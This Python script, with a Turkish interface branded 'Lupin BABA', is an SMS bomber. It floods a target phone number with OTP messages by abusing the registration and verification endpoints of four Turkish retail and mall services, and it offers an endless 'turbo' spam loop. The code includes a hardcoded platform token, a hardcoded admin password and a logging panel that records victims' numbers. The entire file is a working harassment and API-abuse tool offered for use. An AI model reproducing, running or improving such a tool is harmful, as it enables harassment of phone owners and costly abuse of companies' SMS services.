import os
import requests
import time
from datetime import datetime
from colorama import Fore, Style, init
import getpass

init(autoreset=True)

class SMSBot:
    def __init__(self, phone=""):
        self.phone = phone
        self.adet = 0
        self.logs = []
        self.admin_password = "passlupin999"

    def clear(self):
        os.system("cls" if os.name == "nt" else "clear")

    def KahveDunyasi(self):
        try:
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "Origin": "https://www.kahvedunyasi.com"
            }
            json = {"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("processStatus") == "Success":
                self.log_action("KahveDunyasi", True)
                print(f"{Fore.GREEN}[+] SMS gönderildi --> {self.phone}")
                self.adet += 1
            else:
                raise Exception("API reddetti")
        except Exception as e:
            self.log_action("KahveDunyasi", False)
            print(f"{Fore.RED}[-] HATA --> {self.phone} ({e})")

    def Metro(self):
        try:
            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            headers = {
                "Accept": "*/*", "Content-Type": "application/json; charset=utf-8", 
                "Accept-Encoding": "gzip, deflate, br", "Applicationversion": "2.4.1", 
                "Applicationplatform": "2", "User-Agent": "Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1", 
                "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"
            }
            json = {"methodType": "2", "mobilePhoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["status"] == "success":
                self.log_action("Metro", True)
                print(f"{Fore.GREEN}[+] SMS gönderildi --> {self.phone} --> mobile.metro-tr.com")
                self.adet += 1
            else:
                raise Exception("API reddetti")
        except Exception as e:
            self.log_action("Metro", False)
            print(f"{Fore.RED}[-] HATA --> {self.phone} ({e})")

    def File(self):
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            headers = {
                "Accept": "*/*", "Content-Type": "application/json", 
                "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", 
                "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", 
                "Accept-Encoding": "gzip, deflate"
            }
            json = {"mobilePhoneNumber": f"90{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["responseType"] == "SUCCESS":
                self.log_action("File", True)
                print(f"{Fore.GREEN}[+] SMS gönderildi --> {self.phone} --> api.filemarket.com.tr")
                self.adet += 1
            else:
                raise Exception("API reddetti")
        except Exception as e:
            self.log_action("File", False)
            print(f"{Fore.RED}[-] HATA --> {self.phone} ({e})")

    def Akasya(self):
        try:
            url = "https://akasyaapi.poilabs.com:443/v1/en/sms"
            headers = {
                "Accept": "*/*", "Content-Type": "application/json", 
                "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", 
                "User-Agent": "Akasya/2.0.13 (com.poilabs.akasyaavm; build:2; iOS 15.8.3) Alamofire/4.9.1", 
                "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8"
            }
            json = {"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json()["result"] == "SMS sended succesfully!":
                self.log_action("Akasya", True)
                print(f"{Fore.GREEN}[+] SMS gönderildi --> {self.phone} --> akasyaapi.poilabs.com")
                self.adet += 1
            else:
                raise Exception("API reddetti")
        except Exception as e:
            self.log_action("Akasya", False)
            print(f"{Fore.RED}[-] HATA --> {self.phone} ({e})")

    def log_action(self, service_name, success):
        ip = self.get_ip()
        ip = self.anonymize_ip(ip)
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        status = "Başarılı" if success else "Başarısız"
        self.logs.append({
            "Service": service_name,
            "Phone": self.phone,
            "Status": status,
            "IP": ip,
            "Timestamp": timestamp
        })

    def get_ip(self):
        try:
            response = requests.get("https://api.ipify.org?format=json", timeout=3)
            return response.json().get("ip", "Yok")
        except:
            return "Yok"

    def anonymize_ip(self, ip):
        if ip == "Yok" or "." not in ip:
            return ip
        parts = ip.split(".")
        if len(parts) == 4:
            return f"{parts[0]}.{parts[1]}.xxx.xxx"
        return ip

    def admin_panel(self):
        password = getpass.getpass(f"{Fore.MAGENTA}Admin şifresi: ")
        if password == self.admin_password:
            print(f"{Fore.GREEN}[✓] Giriş başarılı!\n")
            self.show_logs()
        else:
            print(f"{Fore.RED}[✗] Şifre hatalı.")
            time.sleep(2)
            self.start()

    def show_logs(self):
        print(f"{Fore.LIGHTWHITE_EX}\n--- SMS Gönderim Logları ---")
        for log in self.logs:
            print(f"{Fore.LIGHTYELLOW_EX}{log['Timestamp']} | {log['Phone']} | {log['Service']} | {log['Status']} | IP: {log['IP']}")
        input(f"{Fore.LIGHTBLACK_EX}\nDevam etmek için ENTER...")

    def start(self):
        try:
            self.clear()
            print(f"{Fore.MAGENTA}Lupin BABA\n")
            self.phone = input(f"{Fore.LIGHTWHITE_EX}Numara girin (örn: 5555555555): ").strip()
            if self.phone == "999adminlupin":
                self.clear()
                print(f"{Fore.MAGENTA}Lupin BABA\n")
                self.admin_panel()
                return

            self.clear()
            print(f"{Fore.MAGENTA}Lupin BABA\n")
            print(f"{Fore.BLUE}SMS Gönderim Modu Seçin:")
            print(f"{Fore.LIGHTGREEN_EX}[1] Adet Belirle ve Gönder")
            print(f"{Fore.LIGHTMAGENTA_EX}[2] Turbo Mod (sonsuz spam)\n")

            choice = input(f"{Fore.WHITE}Seçim: ")

            if choice == "1":
                self.clear()
                print(f"{Fore.MAGENTA}Lupin BABA\n")
                adet = int(input(f"{Fore.YELLOW}Kaç adet SMS gönderilsin: "))
                interval = float(input(f"{Fore.YELLOW}Bekleme süresi (saniye): "))
                for _ in range(adet):
                    self.KahveDunyasi()
                    self.Metro()
                    self.File()
                    self.Akasya()
                    print(f"{Fore.CYAN}Bekleniyor... ({interval} sn)\n")
                    time.sleep(interval)
            elif choice == "2":
                self.clear()
                print(f"{Fore.MAGENTA}Lupin BABA\n")
                print(f"{Fore.LIGHTRED_EX}Turbo Mod Başladı! Durdurmak için CTRL+C\n")
                while True:
                    self.KahveDunyasi()
                    self.Metro()
                    self.File()
                    self.Akasya()
                    time.sleep(2)
            else:
                print(f"{Fore.RED}Geçersiz seçim.")
                time.sleep(2)
        except Exception as e:
            print(f"{Fore.RED}Hata: {e}")
            time.sleep(2)

if __name__ == "__main__":
    bot = SMSBot()
    while True:
        try:
            bot.start()
        except KeyboardInterrupt:
            print(f"\n{Fore.LIGHTBLUE_EX}Çıkış yapılıyor...")
            break
